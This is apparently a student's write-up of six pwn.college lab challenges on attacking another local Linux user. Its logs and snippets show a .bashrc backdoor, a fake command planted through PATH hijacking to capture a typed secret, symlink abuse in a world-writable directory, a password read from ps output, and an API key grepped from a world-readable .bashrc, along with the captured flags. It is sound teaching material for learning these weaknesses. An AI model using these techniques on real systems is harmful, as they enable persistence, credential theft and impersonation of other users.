
# 1. Bashrc Backdoor

This challenge prompted me to add a command to another user's `.bashrc` file to get a flag.

## My Solve

**Flag:** `pwn.college{QujC6x6OewJiXgTN2R_WTy2E6aR.0VMzEzNxwCM2EDNzEzW}`

I had write access to the `.bashrc` file for the `zardus` user. I edited the file and added `cat /flag` to the end. Then, I ran the `/challenge/victim` script, which simulated `zardus` logging in. Their shell automatically executed the command I added, which printed the flag.

`/home/zardus/.bashrc`:
```
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
cat /flag
```

```
hacker@shenanigans~bashrc-backdoor:~$ nano /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{QujC6x6OewJiXgTN2R_WTy2E6aR.0VMzEzNxwCM2EDNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```

## What I Learned

I learnt that the `.bashrc` file is executed every time a new interactive bash shell starts, and modifying it can be a way to run commands as another user.

## References

The problem statement provided was the reference used.

```
When your shell starts up, it looks for .bashrc file in your home directory and executes it as a startup script.
...
In this challenge, we'll pretend that you've broken into a victim user's machine!
That user is named zardus, with a home directory of /home/zardus.
You, as the hacker user, have write access to his .bashrc, and zardus has read-access to /flag.
The victim is simulated by the script /challenge/victim, and you can launch this script at any time to observe the victim logging into the computer.
Can you get the flag?
```


# 2. Sniffing Input

This challenge prompted me to hijack a command by modifying another user's `PATH` to intercept their input.

## My Solve

**Flag:** `pwn.college{oX_tEAySAg3xzB4CjOur6vH08zk.0VNzEzNxwCM2EDNzEzW}`

To capture the flag that the `zardus` user types, I used a two-part attack. First, I created a fake `flag_checker` script in my home directory that would echo back any input it received. Second, I edited zardus's `.bashrc` file to add my home directory to the beginning of their `PATH`. When I ran the victim simulation, their shell found and executed my fake script, revealing the flag they typed.

Content of `/home/hacker/flag_checker`:

```
#!/bin/bash
echo "Type the flag, victim: "
read flag
echo "$flag"
```

```
PATH="/home/hacker:/home/zardus:$PATH"
```

```
hacker@shenanigans~sniffing-input:~$ nano flag_checker
hacker@shenanigans~sniffing-input:~$ nano /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: **********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag, victim: 
pwn.college{oX_tEAySAg3xzB4CjOur6vH08zk.0VNzEzNxwCM2EDNzEzW}
zardus@shenanigans~sniffinput:~$ exit
logout
```

## What I Learned

I learnt that you can combine `.bashrc` modification with `PATH` hijacking to replace legitimate commands with malicious scripts, allowing you to intercept a user's input.

## References

The problem statement provided was the reference used.

```
...Zardus doesn't keep the flag lying around in a readable file after he logs in.
Instead he'll run a command named flag_checker, manually typing the flag into it for verification.
Your mission is to use your continued write access to Zardus's .bashrc to intercept this flag.
Remember how you hijacked commands in the Pondering PATH module?
Can you use that capability to hijack the flag_checker?
```


# 3. Oversharing Directories

This challenge prompted me to replace a user's `.bashrc` by exploiting a world-writable home directory.

## My Solve

**Flag:** `pwn.college{UgJSFsvTl6ZZEr-0WE0BZcLRdcB.0FM0EzNxwCM2EDNzEzW}`

Zardus's home directory `/home/zardus` was world-writable. This allowed me to delete his original `.bashrc` file and create a new one in its place. I put a `PATH` modification in the new `.bashrc` to point to my fake `flag_checker` script (the same one from the previous challenge). When the victim simulation ran, it executed my backdoored `.bashrc` and fake script, revealing the flag.

Content of `/home/hacker/flag_checker`:
```
#!/bin/bash
echo "Type the flag, victim: "
read flag
echo "$flag"
```

Content of the new `/home/zardus/.bashrc`:
```
PATH="/home/hacker:/home/zardus:$PATH"
```

```
hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
rm: remove write-protected regular file '/home/zardus/.bashrc'? y
hacker@shenanigans~overshared-directories:~$ nano /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag, victim:
*************************************************************pwn.college{UgJSFsvTl6ZZEr-0WE0BZcLRdcB.0FM0EzNxwCM2EDNzEzW}
```

## What I Learned

I learnt that write permissions on a directory are powerful. They allow you to delete or create new files within that directory, even if you don't have write permissions on the files themselves.

## References

The problem statement provided was the reference used.

```
...a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it.
...
In this challenge, for convenience, Zardus opened up his home directory:

zardus@dojo:~$ chmod a+w /home/zardus

As you know, there are lots of sensitive files in that directory such as .bashrc!
Can you replicate the previous attack with write access to /home/zardus instead of /home/zardus/.bashrc?
```

# 4. Tricky Linking

This challenge prompted me to use a symbolic link to trick a privileged user into modifying their own `.bashrc` file.

## My Solve

**Flag:** `pwn.college{YvxaGA68iJIY61azf4705aTqkgR.0VM0EzNxwCM2EDNzEzW}`

The victim user `zardus` would append a command to `/tmp/collab/evil-commands.txt`. Since the `/tmp/collab` directory was world-writable, I deleted the original file and replaced it with a symbolic link to `/home/zardus/.bashrc`. I then ran the victim simulation, which caused the `cat /flag` command to be written into zardus's `.bashrc`. I ran the victim simulation a second time, and when zardus logged in, the backdoored `.bashrc` executed and printed the flag.

```
hacker@shenanigans~tricky-linking:~$ rm /tmp/collab/evil-commands.txt
rm: remove write-protected regular file '/tmp/collab/evil-commands.txt'? y
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: **********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: **********
pwn.college{YvxaGA68iJIY61azf4705aTqkgR.0VM0EzNxwCM2EDNzEzW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```

## What I Learned

I learnt that if a directory is world-writable, you can replace files inside it with symbolic links. This can trick privileged processes into writing to sensitive files, like a user's `.bashrc`.

## References

The problem statement provided was the reference used.

```
...having write access to /tmp/collab, the hacker user can replace that evil-commands.txt file.
Also remember from Comprehending Commands that files can link to other files.
What happens if hacker replaces evil-commands.txt with a symbolic link to some sensitive file that zardus can write to?
...
You'll need to run /challenge/victim twice: once to get cat /flag written to where you want, and once to trigger it!
```

# 5. Sniffing Process Arguments

This challenge prompted me to find a password in the arguments of a running process.

## My Solve

**Flag:** `pwn.college{cyxgavPzXzGalA3wSjzkOcBoZUQ.0FOzEzNxwCM2EDNzEzW}`

I used `ps aux` to list all running processes. In the output, I found a script being run by the `zardus` user that had a password (`pw_3108910492`) passed as a command-line argument. I used that password with `su zardus` to log in as them, and then used `sudo cat /flag` to get the flag.

```
hacker@shenanigans~sniffing-process-arguments:~$ ps aux
ps aux

USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND

root           1  0.0  0.0   1056   640 ?        Ss   17:40   0:00 /sbin/docker-init -- /nix/var/nix/profiles/dojo-workspace/bin/dojo-init /run/dojo/bin/slee

root           7  0.0  0.0 231708  2560 ?        S    17:40   0:00 /run/dojo/bin/sleep 6h

root         147  0.0  0.0   5204  3520 ?        S    17:40   0:00 su -c auto.sh --user zardus --pass pw_3108910492 zardus

zardus       151  0.0  0.0   4132  2560 ?        Ss   17:40   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw_3108910492

zardus       152  0.0  0.0 231708  2560 ?        S    17:40   0:00 sleep 6h

hacker       156  0.0  0.0 231576  3520 pts/0    Ss   17:40   0:00 /nix/store/0nxvi9r5ymdlr2p24rjj9qzyms72zld1-bash-interactive-5.2p37/bin/bash /run/dojo/bin

hacker       162  0.0  0.0 231940  4160 pts/0    S    17:40   0:00 /run/dojo/bin/bash --login

hacker       204  0.0  0.0 233600  3840 pts/0    R+   17:48   0:00 ps aux


hacker@shenanigans~sniffing-process-arguments:~$ su zardus
Password:pw_3108910492
zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag
pwn.college{cyxgavPzXzGalA3wSjzkOcBoZUQ.0FOzEzNxwCM2EDNzEzW}
```

## What I Learned

I learnt that command-line arguments are often visible to all users on a system via the `ps` command, so it's a bad place to put sensitive information like passwords.

## References

The problem statement provided was the reference used.

```
But what would happen if one of the arguments of one of those 
commands was something sensitive, like the flag or a password?
This happens, and nefarious users sharing the same machine (or somehow 
otherwise listing processes on it) can steal that data and use it!
That's what this challenge explores.
Zardus is using an automation script, passing his account password to it as an argument.
...
Steal the password, log in to Zardus' account (recall the su command from the Untangling Users module), and get that flag!
```


# 6. Snooping on configurations

This challenge prompted me to find a secret API key in another user's world-readable `.bashrc` file.

## My Solve

**Flag:** `pwn.college{0Ts8xVbwybFzLPBnPM1SDr-mBEJ.0lM0EzNxwCM2EDNzEzW}`

Zardus's `.bashrc` file was world-readable. I used `cat` and `grep` to read the file and find the line containing the `FLAG_GETTER_API_KEY`. I then used that key with the `flag_getter` program to get the flag.

Bash

```
hacker@shenanigans~snooping-on-configurations:~$ cat /home/zardus/.bashrc | grep "API"
FLAG_GETTER_API_KEY=sk-29265335
hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-29265335
Correct API key! Do you want me to print the flag (y/n)?
y
pwn.college{0Ts8xVbwybFzLPBnPM1SDr-mBEJ.0lM0EzNxwCM2EDNzEzW}
```

## What I Learned

I learnt that configuration files like `.bashrc` can be a source of leaked secrets if they have insecure (e.g., world-readable) permissions.

## References

The problem statement provided was the reference used.

```
...many files in a typical user's home directory are world-readable by default, despite frequently being used to store sensitive information.
...
Since .bashrc is processed by the shell at startup, that is
 where people typically put initializations for any environment 
variables they want to customize.
...
Naturally, Zardus stores his key in .bashrc.
Can you steal the key and get the flag?
```
